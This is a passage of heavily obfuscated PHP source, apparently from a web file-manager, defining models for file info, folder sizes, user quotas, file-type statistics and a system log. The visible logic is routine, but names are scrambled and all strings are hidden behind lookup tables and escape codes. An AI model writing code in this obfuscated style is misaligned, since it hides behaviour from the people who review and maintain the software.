$Ìõ¾å¸Ô[$ù¥ŸÓË¤[89]]); if (!$Î³¯®ø×) { return Model($ù¥ŸÓË¤[555])->remove($Ìõ¾å¸Ô[$ù¥ŸÓË¤[552]]); } $this->folderSizeReset($®„ÌÒËÀ[$ù¥ŸÓË¤[202]]); return !0; } public function fileSubstr($´©Åğí™, $Œµ‚Ô¦, $¤Åèû) { $‡»ÛÓåÑ = $this->fileInfoGet($´©Åğí™); if (!$‡»ÛÓåÑ) { return !1; } return IO::fileSubstr($‡»ÛÓåÑ[$_SERVER[¼èá¯æÙ][97]], $Œµ‚Ô¦, $¤Åèû); } public function fileInfoGet($áĞÂŞêÊ) { $¦ğ¡ĞÃ´ =& $_SERVER[¼èá¯æÙ]; $ìõ°µé» = $this->sourceInfo($áĞÂŞêÊ); if (!$ìõ°µé» || $ìõ°µé»[$¦ğ¡ĞÃ´[496]]) { return !1; } $õœÕÓ‡¥ = $¦ğ¡ĞÃ´[559] . $ìõ°µé»[$¦ğ¡ĞÃ´[552]]; $±‚›®‹™ = _get(self::$cacheFileInfo, $õœÕÓ‡¥); if ($±‚›®‹™) { return $±‚›®‹™; } $øƒ´œ½‰ = Model($¦ğ¡ĞÃ´[555])->fileInfo($ìõ°µé»[$¦ğ¡ĞÃ´[552]]); if ($øƒ´œ½‰) { $øƒ´œ½‰[$¦ğ¡ĞÃ´[32]] = $ìõ°µé»[$¦ğ¡ĞÃ´[32]]; } self::$cacheFileInfo[$õœÕÓ‡¥] = $øƒ´œ½‰; return $øƒ´œ½‰; } private function folderChildrenNumber($ğÑ Ø¨À) { $˜ñäÈúë =& $_SERVER[¼èá¯æÙ]; $¹İ¬ã‚ = $this->sourceInfo($ğÑ Ø¨À); $ÑŸâ¼¦‘ = array($˜ñäÈúë[666] => array($˜ñäÈúë[626], $¹İ¬ã‚[$˜ñäÈúë[595]] . $ğÑ Ø¨À . $˜ñäÈúë[627]), $˜ñäÈúë[663] => $¹İ¬ã‚[$˜ñäÈúë[580]], $˜ñäÈúë[515] => intval($¹İ¬ã‚[$˜ñäÈúë[516]]), $˜ñäÈúë[660] => 1); $ÓóÄÛÂ¸ = $this->where($ÑŸâ¼¦‘)->count(); $…«¿Ûõ = $this->where($ÑŸâ¼¦‘)->where(array($˜ñäÈúë[660] => 0))->count(); return array($˜ñäÈúë[93] => $…«¿Ûõ, $˜ñäÈúë[94] => $ÓóÄÛÂ¸); } public function pathInfo($À¿°…É®, $„‰šôú’ = false) { $’â¼³ =& $_SERVER[¼èá¯æÙ]; $„‰šôú’ = !1; $À¿°…É® = intval($À¿°…É®); $„š¬ ªå = $’â¼³[545] . intval($„‰šôú’) . $’â¼³[473] . $À¿°…É®; $Éª°°ñÃ = _get(self::$cachePathInfo, $„š¬ ªå); if ($Éª°°ñÃ) { return $Éª°°ñÃ; } $Ï×şÀ³ = $this->sourceInfo($À¿°…É®); if (!$Ï×şÀ³) { return !1; } $Ï×şÀ³ = $this->_listDataApplyItem($Ï×şÀ³, $„‰šôú’); self::$cachePathInfo[$„š¬ ªå] = $Ï×şÀ³; return $Ï×şÀ³; } public static $cachePathInfoMore = array(); public function pathInfoMore($»£±µÚÀ) { $­ Ø­æ =& $_SERVER[¼èá¯æÙ]; $‚¡ã…Í¥ = _get(self::$cachePathInfoMore, $»£±µÚÀ); if ($‚¡ã…Í¥) { return $‚¡ã…Í¥; } $ØÓ´„ª¹ = $this->pathInfo($»£±µÚÀ); if (!$ØÓ´„ª¹) { return !1; } if ($ØÓ´„ª¹[$­ Ø­æ[496]] == $­ Ø­æ[101]) { $ØÓ´„ª¹[$­ Ø­æ[92]] = $this->folderChildrenNumber($»£±µÚÀ); } self::$cachePathInfoMore[$»£±µÚÀ] = $ØÓ´„ª¹; return $ØÓ´„ª¹; } public function sourceInfo($“Úˆçá±) { $Óêû®å¹ =& $_SERVER[¼èá¯æÙ]; if (!$“Úˆçá±) { return array(); } $“Úˆçá± = intval($“Úˆçá±); $àœøœÖ„ = $Óêû®å¹[544] . $“Úˆçá±; $®—Ù€×ô = _get(self::$cacheSourceInfo, $àœøœÖ„); if ($®—Ù€×ô) { return $®—Ù€×ô; } $ÙŞÇ¤´¤ = $this->where(array($Óêû®å¹[203] => $“Úˆçá±))->find(); self::$cacheSourceInfo[$àœøœÖ„] = $ÙŞÇ¤´¤; return self::$cacheSourceInfo[$àœøœÖ„]; } public function sourceCacheClear($Û‚£÷° = false) { self::cacheClear($Û‚£÷°); } public static function cacheClear($éÙ©¦Öè = false) { $¶†«ôÓÁ =& $_SERVER[¼èá¯æÙ]; if ($éÙ©¦Öè == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); return; } unset(self::$cacheSourceInfo[$¶†«ôÓÁ[544] . $éÙ©¦Öè]); unset(self::$cachePathInfoMore[$éÙ©¦Öè]); unset(self::$cachePathInfo[$¶†«ôÓÁ[2298] . $éÙ©¦Öè]); unset(self::$cachePathInfo[$¶†«ôÓÁ[2299] . $éÙ©¦Öè]); } public function metaSet($Å’İØ¿‘, $ã±«ûÆë = null, $²«ñ‰• = null) { $©ÂÂ¢‡Œ = parent::metaSet($Å’İØ¿‘, $ã±«ûÆë, $²«ñ‰•); if ($©ÂÂ¢‡Œ) { $this->sourceCacheClear($Å’İØ¿‘); } return $©ÂÂ¢‡Œ; } public function pathInfoByPath($ƒ‚Ø€èÕ, $¡‡Ëö¦) { $ÙËÉò™ =& $_SERVER[¼èá¯æÙ]; $öµÛñ°ˆ = !$¡‡Ëö¦ ? array() : explode($ÙËÉò™[8], trim($¡‡Ëö¦, $ÙËÉò™[8])); $÷¼Üù¿ = $ƒ‚Ø€èÕ; foreach ($öµÛñ°ˆ as $ş†«§—) { $äñÚ½àˆ = array($ÙËÉò™[202] => $÷¼Üù¿, $ÙËÉò™[32] => $ş†«§—); $¡¯’ï¡Ó = $this->field($ÙËÉò™[2300])->where($äñÚ½àˆ)->select(); if (!$¡¯’ï¡Ó) { return !1; } $¡¯’ï¡Ó = array_sort_by($¡¯’ï¡Ó, $ÙËÉò™[516]); $÷¼Üù¿ = $¡¯’ï¡Ó[0][$ÙËÉò™[203]]; } $“¥áÕÈœ = $this->sourceInfo($÷¼Üù¿); $this->pathInfoFilter($“¥áÕÈœ); return $“¥áÕÈœ; } protected function updateModifyTime($üâÀ¢¥¾) { $ûáÚ“ı– =& $_SERVER[¼èá¯æÙ]; $Î¢æÅº = defined($ûáÚ“ı–[2209]) ? USER_ID : 0; if (!$üâÀ¢¥¾) { return; } if (!is_array($üâÀ¢¥¾)) { $üâÀ¢¥¾ = array($üâÀ¢¥¾); } foreach ($üâÀ¢¥¾ as $óœÛ‚Í => $–ú¶èá„) { $üâÀ¢¥¾[$óœÛ‚Í] = intval($–ú¶èá„); $this->sourceCacheClear($–ú¶èá„); } $…ù¨ùùÓ = array($ûáÚ“ı–[203] => array($ûáÚ“ı–[7], $üâÀ¢¥¾)); $ÉÓ†Õ‰Ô = array($ûáÚ“ı–[665] => $Î¢æÅº, $ûáÚ“ı–[509] => time()); $this->where($…ù¨ùùÓ)->save($ÉÓ†Õ‰Ô); } public function folderSizeReset($½–îïÏ„, $ÊÖ­ˆœØ = false) { $¤Çñä¸Ú =& $_SERVER[¼èá¯æÙ]; if ($this->statusIgnoreResetSpace) { return; } $¶¦ŠëÊê = $this->sourceInfo($½–îïÏ„); $Û†ÆÒİ = $¤Çñä¸Ú[2301] . $½–îïÏ„; CacheLock::lock($Û†ÆÒİ, 20); if ($ÊÖ­ˆœØ === !1) { $this->sourceCacheClear($½–îïÏ„); $¶¦ŠëÊê = $this->sourceInfo($½–îïÏ„); $ÅÖ¦ô– = array($¤Çñä¸Ú[488] => $½–îïÏ„, $¤Çñä¸Ú[515] => 0); $Ö„£«†  = $this->where($ÅÖ¦ô–)->sum($¤Çñä¸Ú[89]); $ÊÖ­ˆœØ = intval($Ö„£«† ) - intval($¶¦ŠëÊê[$¤Çñä¸Ú[89]]); } if ($ÊÖ­ˆœØ == 0) { return CacheLock::unlock($Û†ÆÒİ); } $ß½‘áˆÓ = $this->parentLevelArray($¶¦ŠëÊê[$¤Çñä¸Ú[595]]); if (!$ß½‘áˆÓ) { $ß½‘áˆÓ = array(); } $ß½‘áˆÓ[] = $¶¦ŠëÊê[$¤Çñä¸Ú[203]]; $ÅÖ¦ô– = array($¤Çñä¸Ú[203] => array($¤Çñä¸Ú[503], $ß½‘áˆÓ)); if ($ÊÖ­ˆœØ < 0) { $ÅÖ¦ô–[$¤Çñä¸Ú[89]] = array($¤Çñä¸Ú[1097], abs($ÊÖ­ˆœØ)); } $this->where($ÅÖ¦ô–)->setAdd($¤Çñä¸Ú[89], $ÊÖ­ˆœØ); CacheLock::unlock($Û†ÆÒİ); $òè©•Æª = $¤Çñä¸Ú[2302] . $¶¦ŠëÊê[$¤Çñä¸Ú[200]] . $¤Çñä¸Ú[4] . $¶¦ŠëÊê[$¤Çñä¸Ú[580]]; $¨³ú—ªë = array($¶¦ŠëÊê[$¤Çñä¸Ú[200]], $¶¦ŠëÊê[$¤Çñä¸Ú[580]]); TaskRun::timeLimitCall($òè©•Æª, $¤Çñä¸Ú[2303], $¨³ú—ªë, 1.5); } public function folderSizeResetChildren($‚ºŸ«¤) { $ŞŒÍß¸ı =& $_SERVER[¼èá¯æÙ]; $this->sourceCacheClear($‚ºŸ«¤); $Òºöı¾À = $this->sourceInfo($‚ºŸ«¤); $èÕó—àÊ = array($ŞŒÍß¸ı[660] => 1, $ŞŒÍß¸ı[663] => $Òºöı¾À[$ŞŒÍß¸ı[580]], $ŞŒÍß¸ı[666] => array($ŞŒÍß¸ı[626], $Òºöı¾À[$ŞŒÍß¸ı[595]] . $‚ºŸ«¤ . $ŞŒÍß¸ı[627])); $«‡¹”ßÚ = $ŞŒÍß¸ı[2304]; $¼ø‰õ¶ = $this->field($«‡¹”ßÚ)->where($èÕó—àÊ)->select(); $èÕó—àÊ[$ŞŒÍß¸ı[496]] = 0; $àµçí¼° = $this->field($«‡¹”ßÚ)->where($èÕó—àÊ)->select(); if (!$àµçí¼°) { return; } $¼ø‰õ¶[] = $Òºöı¾À; $¼ø‰õ¶ = array_to_keyvalue($¼ø‰õ¶, $ŞŒÍß¸ı[203]); foreach ($¼ø‰õ¶ as $ïèšÆ©ü => $ÊÖ °¥Š) { $¼ø‰õ¶[$ïèšÆ©ü][$ŞŒÍß¸ı[2305]] = $¼ø‰õ¶[$ïèšÆ©ü][$ŞŒÍß¸ı[89]]; $¼ø‰õ¶[$ïèšÆ©ü][$ŞŒÍß¸ı[89]] = 0; } foreach ($àµçí¼° as $ÊÖ °¥Š) { $ÙÉ¡ë Ü = $ÊÖ °¥Š[$ŞŒÍß¸ı[202]] . $ŞŒÍß¸ı[12]; if (!isset($¼ø‰õ¶[$ÙÉ¡ë Ü])) { continue; } if ($ÊÖ °¥Š[$ŞŒÍß¸ı[516]] == $¼ø‰õ¶[$ÙÉ¡ë Ü][$ŞŒÍß¸ı[516]]) { $¼ø‰õ¶[$ÙÉ¡ë Ü][$ŞŒÍß¸ı[89]] += $ÊÖ °¥Š[$ŞŒÍß¸ı[89]]; } } foreach ($¼ø‰õ¶ as $ÊÖ °¥Š) { $´ä™ôŸ¶ = $this->parentLevelArray($ÊÖ °¥Š[$ŞŒÍß¸ı[595]]); foreach ($´ä™ôŸ¶ as $ÙÉ¡ë Ü) { $ÙÉ¡ë Ü = $ÙÉ¡ë Ü . $ŞŒÍß¸ı[12]; if (!isset($¼ø‰õ¶[$ÙÉ¡ë Ü])) { continue; } if ($ÊÖ °¥Š[$ŞŒÍß¸ı[516]] == $¼ø‰õ¶[$ÙÉ¡ë Ü][$ŞŒÍß¸ı[516]]) { $¼ø‰õ¶[$ÙÉ¡ë Ü][$ŞŒÍß¸ı[89]] += $ÊÖ °¥Š[$ŞŒÍß¸ı[89]]; } } } $„¨•ğúœ = array(); foreach ($¼ø‰õ¶ as $ÊÖ °¥Š) { if ($ÊÖ °¥Š[$ŞŒÍß¸ı[89]] == $ÊÖ °¥Š[$ŞŒÍß¸ı[2305]]) { continue; } $„¨•ğúœ[] = array($ŞŒÍß¸ı[203], $ÊÖ °¥Š[$ŞŒÍß¸ı[203]], $ŞŒÍß¸ı[89], $ÊÖ °¥Š[$ŞŒÍß¸ı[89]]); } $this->saveAll($„¨•ğúœ); } public function userSpaceReset($®óöºş = false) { $¯ˆû¤—  =& $_SERVER[¼èá¯æÙ]; $ãñşÖÜ© = $this->where(array($¯ˆû¤— [200] => self::TYPE_USER, $¯ˆû¤— [580] => $®óöºş, $¯ˆû¤— [496] => 0))->sum($¯ˆû¤— [89]); $ãñşÖÜ© = !$ãñşÖÜ© || $ãñşÖÜ© <= 0 ? 0 : $ãñşÖÜ©; Model($¯ˆû¤— [588])->userEdit($®óöºş, array($¯ˆû¤— [1967] => $ãñşÖÜ©)); } public function targetSpaceUpdate($üí’‰ˆì, $ëˆÓ¿†˜) { $ëÕóÈ—Ä =& $_SERVER[¼èá¯æÙ]; if (!$ëˆÓ¿†˜) { return; } if (!in_array($üí’‰ˆì, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $·úÄ¤»Î = $this->targetSpaceSize($üí’‰ˆì, $ëˆÓ¿†˜); if ($üí’‰ˆì == self::TYPE_USER) { Model($ëÕóÈ—Ä[588])->userEdit($ëˆÓ¿†˜, array($ëÕóÈ—Ä[1967] => $·úÄ¤»Î)); } else { if ($üí’‰ˆì == self::TYPE_GROUP) { Model($ëÕóÈ—Ä[596])->groupEdit($ëˆÓ¿†˜, array($ëÕóÈ—Ä[1967] => $·úÄ¤»Î)); } } } public function targetSpaceSize($¾•ıº°Ù, $ı²´Ã¼¤) { $ñ¶‹Œ® =& $_SERVER[¼èá¯æÙ]; $§íê¹î¨ = 0; $–¼ø˜»Š = $this->targetSourceRoot($¾•ıº°Ù, $ı²´Ã¼¤, !0); foreach ($–¼ø˜»Š as $ë±Àê£Å) { if (!$ë±Àê£Å) { continue; } $§íê¹î¨ += floatval($ë±Àê£Å[$ñ¶‹Œ®[89]]); $õÖ‘ƒÍÖ = array($ñ¶‹Œ®[666] => array($ñ¶‹Œ®[626], $ñ¶‹Œ®[604] . $ë±Àê£Å[$ñ¶‹Œ®[203]] . $ñ¶‹Œ®[627])); $´ìûöÛ = Model($ñ¶‹Œ®[514])->field($ñ¶‹Œ®[502])->where($õÖ‘ƒÍÖ)->select(); $´ìûöÛ = array_to_keyvalue($´ìûöÛ, $ñ¶‹Œ®[12], $ñ¶‹Œ®[203]); $´ìûöÛ = array_unique(array_filter($´ìûöÛ)); if ($´ìûöÛ) { $õÖ‘ƒÍÖ = array($ñ¶‹Œ®[502] => array($ñ¶‹Œ®[503], $´ìûöÛ)); $§íê¹î¨ += floatval($this->where($õÖ‘ƒÍÖ)->sum($ñ¶‹Œ®[89])); } } $§íê¹î¨ = !$§íê¹î¨ || $§íê¹î¨ <= 0 ? 0 : $§íê¹î¨; return $§íê¹î¨; } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($ğ’ÕÚş) { return $this->fileTypeProfile($ğ’ÕÚş, SourceModel::TYPE_USER); } public function groupFileTypeProfile($ı‡‰åÉ) { return $this->fileTypeProfile($ı‡‰åÉ, SourceModel::TYPE_GROUP); } private function fileTypeProfile($ÂÖöˆàÉ, $“’Ü¸¥†) { $ëİØØø =& $_SERVER[¼èá¯æÙ]; $¿œÃŠã¼ = $ëİØØø[2306] . $ÂÖöˆàÉ . $ëİØØø[11] . $“’Ü¸¥†; $†ä‚¿¶’ = Cache::get($¿œÃŠã¼); if ($†ä‚¿¶’) { return $†ä‚¿¶’; } $››¦•«û = array($ëİØØø[660] => 0); if ($ÂÖöˆàÉ != !1) { $››¦•«û[$ëİØØø[580]] = $ÂÖöˆàÉ; $››¦•«û[$ëİØØø[200]] = $“’Ü¸¥†; } $ì’ÇÉñ = array(); $ì’ÇÉñ[$ëİØØø[2307]] = array($ëİØØø[2308] => LNG($ëİØØø[2307]), $ëİØØø[2309] => $this->where($››¦•«û)->count(), $ëİØØø[631] => $this->where($››¦•«û)->sum($ëİØØø[89])); $„«¶Î—Ë = KodIO::fileTypeList(); foreach ($„«¶Î—Ë as $üªö±è¢ => $ü‡şÁ’æ) { $››¦•«û[$ëİØØø[497]] = $this->fileTypeWhere($üªö±è¢); $ì’ÇÉñ[$üªö±è¢] = array($ëİØØø[2308] => $ü‡şÁ’æ[$ëİØØø[32]], $ëİØØø[2309] => $this->where($››¦•«û)->count(), $ëİØØø[631] => $this->where($››¦•«û)->sum($ëİØØø[89])); } Cache::set($¿œÃŠã¼, $ì’ÇÉñ, 1200); return $ì’ÇÉñ; } public function fileNameExist($¾·±ğŞÊ, $óÉÔò«Å) { $œ§öŠ˜Â =& $_SERVER[¼èá¯æÙ]; $±–„¸îæ = $this->field($œ§öŠ˜Â[2310])->where(array($œ§öŠ˜Â[202] => $¾·±ğŞÊ, $œ§öŠ˜Â[32] => $óÉÔò«Å, $œ§öŠ˜Â[516] => 0))->find(); return is_array($±–„¸îæ) ? $±–„¸îæ[$œ§öŠ˜Â[203]] : !1; } public function childList($ÌÜÑÜñ) { $ÓÊÉşûª =& $_SERVER[¼èá¯æÙ]; $„­ÊÀÌù = $ÓÊÉşûª[2283] . $ÌÜÑÜñ; if (isset(self::$cacheChildList[$„­ÊÀÌù])) { return self::$cacheChildList[$„­ÊÀÌù]; } $¡ø±¸·Æ = array($ÓÊÉşûª[202] => intval($ÌÜÑÜñ), $ÓÊÉşûª[516] => 0); $ŠåË¹­» = $this->where($¡ø±¸·Æ)->select(); $ŠåË¹­» = $ŠåË¹­» ? $ŠåË¹­» : array(); self::$cacheChildList[$„­ÊÀÌù] = $ŠåË¹­»; foreach ($ŠåË¹­» as $“ğÑ•) { $„­ÊÀÌù = $ÓÊÉşûª[544] . $“ğÑ•[$ÓÊÉşûª[203]]; self::$cacheSourceInfo[$„­ÊÀÌù] = $“ğÑ•; } return $ŠåË¹­»; } public function fileNameAuto($´µŒ, $³Ÿ¥âÍ, $ÖÖÙéÑÎ = REPEAT_RENAME, $¥îë¾ ã = false) { $†·×¸°å =& $_SERVER[¼èá¯æÙ]; $‰È­ğü = get_path_ext($³Ÿ¥âÍ); $ËùÙ ‡† = $‰È­ğü ? get_path_ext_name($³Ÿ¥âÍ) . $†·×¸°å[2311] . $‰È­ğü : $³Ÿ¥âÍ . $†·×¸°å[471]; $‚¾µÜ§ = array($†·×¸°å[202] => $´µŒ, $†·×¸°å[516] => 0, $†·×¸°å[32] => array($†·×¸°å[470], $ËùÙ ‡†)); $‹ŒŞıÉÈ = $this->field($†·×¸°å[32])->where($‚¾µÜ§)->select(); $šûÄ£úæ = array_to_keyvalue($‹ŒŞıÉÈ, $†·×¸°å[12], $†·×¸°å[32]); return $this->fileNameAutoGet($šûÄ£úæ, $³Ÿ¥âÍ, $ÖÖÙéÑÎ, $¥îë¾ ã); } public function fileNameAutoGet($‡ì­ÚØõ, $Çœîòèù, $£âë²øÙ, $Ÿ¶‡ç·¶) { $ŞŸ‘ÎùÜ =& $_SERVER[¼èá¯æÙ]; if ($£âë²øÙ == REPEAT_REPLACE || !$‡ì­ÚØõ || !in_array_not_case($Çœîòèù, $‡ì­ÚØõ) || $Ÿ¶‡ç·¶ && $£âë²øÙ != REPEAT_RENAME_FOLDER) { return $Çœîòèù; } if ($£âë²øÙ == REPEAT_SKIP) { return !1; } $ù®ËìÒ = $ŞŸ‘ÎùÜ[10] . get_path_ext($Çœîòèù); $ù®ËìÒ = $ù®ËìÒ == $ŞŸ‘ÎùÜ[10] || $Ÿ¶‡ç·¶ ? $ŞŸ‘ÎùÜ[12] : $ù®ËìÒ; for ($ê¯¼—¿ = 1; $ê¯¼—¿ <= count($‡ì­ÚØõ) + 1; $ê¯¼—¿++) { $ÙáÙ­¡ó = substr($Çœîòèù, 0, strlen($Çœîòèù) - strlen($ù®ËìÒ)); $ÂÚÈÅ¨¾ = $ÙáÙ­¡ó . "\x28{$ê¯¼—¿}\51{$ù®ËìÒ}"; if (!in_array_not_case($ÂÚÈÅ¨¾, $‡ì­ÚØõ)) { return $ÂÚÈÅ¨¾; } } } } goto b¹ö‰£Ì…Å; CœÅ•‚Ğ£ó: class SystemLightAppModel extends ModelBaseLight { public $optionType = "\x53\171\163\x74\145\155\x2e\x4c\x69\147\x68\164\x41\x70\160"; public $modelType = "\123\171\x73\x74\145\x6d\117\160\x74\151\x6f\x6e"; public $field = array("\x6e\141\x6d\x65", "\x67\x72\x6f\x75\x70", "\x64\145\163\x63", "\x63\x6f\156\164\x65\156\164"); public function listData($ôÌşÄò¨ = false, $«Ôˆô»Ç = "\x6d\157\144\x69\x66\171\x54\x69\x6d\x65", $˜øğ´ê³ = true) { return parent::listData($ôÌşÄò¨, $«Ôˆô»Ç, $˜øğ´ê³); } public function remove($êÁ³ƒ¾Ë) { $ëçüˆ™ = $this->findByName($êÁ³ƒ¾Ë); if (!$ëçüˆ™) { return !1; } return parent::remove($ëçüˆ™[$_SERVER[¼èá¯æÙ][486]]); } public function add($šÖ»™®) { if ($this->findByName($šÖ»™®[$_SERVER[¼èá¯æÙ][32]])) { return !1; } return parent::insert($šÖ»™®); } public function update($¨êº¯ÆÑ, $€â™ÒËÙ) { $ÇÑ€¬İ =& $_SERVER[¼èá¯æÙ]; $²º›Ö˜´ = $this->findByName($¨êº¯ÆÑ); $É‰Õ›ìÜ = $this->findByName($€â™ÒËÙ[$ÇÑ€¬İ[32]]); if (!$²º›Ö˜´ || $É‰Õ›ìÜ && $É‰Õ›ìÜ[$ÇÑ€¬İ[486]] != $²º›Ö˜´[$ÇÑ€¬İ[486]]) { return !1; } return parent::update($²º›Ö˜´[$ÇÑ€¬İ[486]], $€â™ÒËÙ); } } class SystemLogModel extends ModelBase { protected $tableName = "\x73\x79\x73\x74\145\155\x5f\x6c\x6f\x67"; protected $dataAuto = array(array("\143\162\145\x61\x74\x65\x54\151\155\145", "\x74\151\155\145", "\151\156\x73\x65\x72\164", "\146\x75\156\x63\x74\x69\157\x6e")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $Ë®¿µÏë =& $_SERVER[¼èá¯æÙ]; return array($Ë®¿µÏë[2351] => LNG($Ë®¿µÏë[2352]), $Ë®¿µÏë[2353] => LNG($Ë®¿µÏë[2354]), $Ë®¿µÏë[1921] => LNG($Ë®¿µÏë[2355]), $Ë®¿µÏë[2356] => LNG($Ë®¿µÏë[2357]), $Ë®¿µÏë[2358] => LNG($Ë®¿µÏë[2359]), $Ë®¿µÏë[2360] => LNG($Ë®¿µÏë[2361]), $Ë®¿µÏë[2362] => LNG($Ë®¿µÏë[2363]), $Ë®¿µÏë[1951] => LNG($Ë®¿µÏë[2363]), $Ë®¿µÏë[1952] => LNG($Ë®¿µÏë[2364]), $Ë®¿µÏë[2365] => LNG($Ë®¿µÏë[2366]), $Ë®¿µÏë[2367] => LNG($Ë®¿µÏë[2368]), $Ë®¿µÏë[2369] => LNG($Ë®¿µÏë[2370]), $Ë®¿µÏë[2371] => LNG($Ë®¿µÏë[2372]), $Ë®¿µÏë[1949] => LNG($Ë®¿µÏë[2373]), $Ë®¿µÏë[2374] => LNG($Ë®¿µÏë[2375]), $Ë®¿µÏë[1956] => LNG($Ë®¿µÏë[2376]), $Ë®¿µÏë[2377] => LNG($Ë®¿µÏë[2378]), $Ë®¿µÏë[2379] => LNG($Ë®¿µÏë[2380]), $Ë®¿µÏë[2381] => LNG($Ë®¿µÏë[2382]), $Ë®¿µÏë[2383] => LNG($Ë®¿µÏë[2384]), $Ë®¿µÏë[1959] => LNG($Ë®¿µÏë[2385]), $Ë®¿µÏë[1960] => LNG($Ë®¿µÏë[2386]), $Ë®¿µÏë[2387] => LNG($Ë®¿µÏë[2388]), $Ë®¿µÏë[2389] => LNG($Ë®¿µÏë[2390]), $Ë®¿µÏë[2391] => LNG($Ë®¿µÏë[2392]), $Ë®¿µÏë[1954] => LNG($Ë®¿µÏë[2393]), $Ë®¿µÏë[2394] => LNG($Ë®¿µÏë[2395]), $Ë®¿µÏë[1953] => LNG($Ë®¿µÏë[2396]), $Ë®¿µÏë[2397] => LNG($Ë®¿µÏë[2398]), $Ë®¿µÏë[2399] => LNG($Ë®¿µÏë[2400]), $Ë®¿µÏë[2401] => LNG($Ë®¿µÏë[2400]), $Ë®¿µÏë[2402] => LNG($Ë®¿µÏë[2403]), $Ë®¿µÏë[2404] => LNG($Ë®¿µÏë[2404]), $Ë®¿µÏë[2405] => LNG($Ë®¿µÏë[1925]), $Ë®¿µÏë[2406] => LNG($Ë®¿µÏë[2407]), $Ë®¿µÏë[2408] => LNG($Ë®¿µÏë[2409]), $Ë®¿µÏë[2410] => LNG($Ë®¿µÏë[2411]), $Ë®¿µÏë[2412] => LNG($Ë®¿µÏë[2413]), $Ë®¿µÏë[2414] => LNG($Ë®¿µÏë[2415]), $Ë®¿µÏë[2416] => LNG($Ë®¿µÏë[2416]), $Ë®¿µÏë[2417] => LNG($Ë®¿µÏë[2418]), $Ë®¿µÏë[2419] => LNG($Ë®¿µÏë[2420]), $Ë®¿µÏë[2421] => LNG($Ë®¿µÏë[2422]), $Ë®¿µÏë[2423] => LNG($Ë®¿µÏë[2424]), $Ë®¿µÏë[2425] => LNG($Ë®¿µÏë[2426]), $Ë®¿µÏë[2427] => LNG($Ë®¿µÏë[2428]), $Ë®¿µÏë[222] => LNG($Ë®¿µÏë[222]), $Ë®¿µÏë[223] => LNG($Ë®¿µÏë[2429]), $Ë®¿µÏë[2430] => LNG($Ë®¿µÏë[2430])); } private function typeFile() { $•‘Ö€å³ =& $_SERVER[¼èá¯æÙ]; $¦Ê‘İş® = array($•‘Ö€å³[1956] => array($•‘Ö€å³[1957]), $•‘Ö€å³[2369] => array($•‘Ö€å³[2431]), $•‘Ö€å³[2371] => array($•‘Ö€å³[2432]), $•‘Ö€å³[1949] => array($•‘Ö€å³[1950], $•‘Ö€å³[2433]), $•‘Ö€å³[2379] => array(), $•‘Ö€å³[2381] => array(), $•‘Ö€å³[2383] => array(), $•‘Ö€å³[1959] => array($•‘Ö€å³[1961]), $•‘Ö€å³[1960] => array($•‘Ö€å³[1961]), $•‘Ö€å³[2387] => array($•‘Ö€å³[2434]), $•‘Ö€å³[2389] => array($•‘Ö€å³[2434]), $•‘Ö€å³[2391] => array($•‘Ö€å³[2435]), $•‘Ö€å³[2377] => array($•‘Ö€å³[2436]), $•‘Ö€å³[1954] => array($•‘Ö€å³[2437]), $•‘Ö€å³[2394] => array($•‘Ö€å³[2438]), $•‘Ö€å³[1953] => array($•‘Ö€å³[1955])); return $¦Ê‘İş®; } private function typeAll() { $’Ì„©ïØ =& $_SERVER[¼èá¯æÙ]; $ÅÀÅóïê = $this->typeList; $…ÁÃøó = array_filter($this->typeFile()); foreach ($…ÁÃøó as $òìÁâ˜ => $£¾¸¶ñ›) { $ÅÀÅóïê[$£¾¸¶ñ›[0]] = $ÅÀÅóïê[$òìÁâ˜]; } $ÅÀÅóïê[$’Ì„©ïØ[1961]] = LNG($’Ì„©ïØ[2439]); $ÅÀÅóïê[$’Ì„©ïØ[2434]] = LNG($’Ì„©ïØ[2440]); return $ÅÀÅóïê; } public function addLog($ÅèëÊÌ, $ÒÕ‰ŠÁº = array()) { $×î¤¼¯— =& $_SERVER[¼èá¯æÙ]; if (!isset($this->typeList[$ÅèëÊÌ])) { return; } $Í“¯ğÊ = Session::get($×î¤¼¯—[2120]); if (!$Í“¯ğÊ) { $Í“¯ğÊ = _get($ÒÕ‰ŠÁº, $×î¤¼¯—[1778], 0); } if ($ÅèëÊÌ == $×î¤¼¯—[2406] && is_array($ÒÕ‰ŠÁº[$×î¤¼¯—[2441]]) && !$ÒÕ‰ŠÁº[$×î¤¼¯—[2441]]) { return; } $¦óÇóªœ = get_client_ip(); if (!$ÒÕ‰ŠÁº || strlen(json_encode($ÒÕ‰ŠÁº)) >= 1024 * 64) { if ($ÒÕ‰ŠÁº && is_array($ÒÕ‰ŠÁº)) { $ÒÕ‰ŠÁº = array_intersect_key($ÒÕ‰ŠÁº, array_flip($×î¤¼¯—[486], $×î¤¼¯—[32])); $ÒÕ‰ŠÁº[$×î¤¼¯—[2442]] = $¦óÇóªœ; } else { $ÒÕ‰ŠÁº = array($×î¤¼¯—[2442] => $¦óÇóªœ); } } else { if (is_array($ÒÕ‰ŠÁº)) { $ÒÕ‰ŠÁº[$×î¤¼¯—[2442]] = $¦óÇóªœ; } else { $ÒÕ‰ŠÁº = array($×î¤¼¯—[1292] => $ÒÕ‰ŠÁº, $×î¤¼¯—[2442] => $¦óÇóªœ); } } $ÒÕ‰ŠÁº = array($×î¤¼¯—[1768] => Session::sign(), $×î¤¼¯—[1769] => intval($Í“¯ğÊ), $×î¤¼¯—[33] => $ÅèëÊÌ, $×î¤¼¯—[1771] => json_encode($ÒÕ‰ŠÁº)); return parent::add($ÒÕ‰ŠÁº); } public function remove($ÉØ’œ­®) { $this->where(array($_SERVER[¼èá¯æÙ][504] => $ÉØ’œ­®))->delete(); } private function _makeOrder($ıøÉİÏå = '') { $ÖÑŞ©Í =& $_SERVER[¼èá¯æÙ]; $È¼ûòÎ = $ÖÑŞ©Í[243]; $¯‘©¿½Ş = array($ÖÑŞ©Í[534] => $ÖÑŞ©Í[535], $ÖÑŞ©Í[536] => $ÖÑŞ©Í[537]); $ˆüÉï¦³ = Input::get($ÖÑŞ©Í[542], $ÖÑŞ©Í[7], $ÖÑŞ©Í[2160], array($ÖÑŞ©Í[2074], 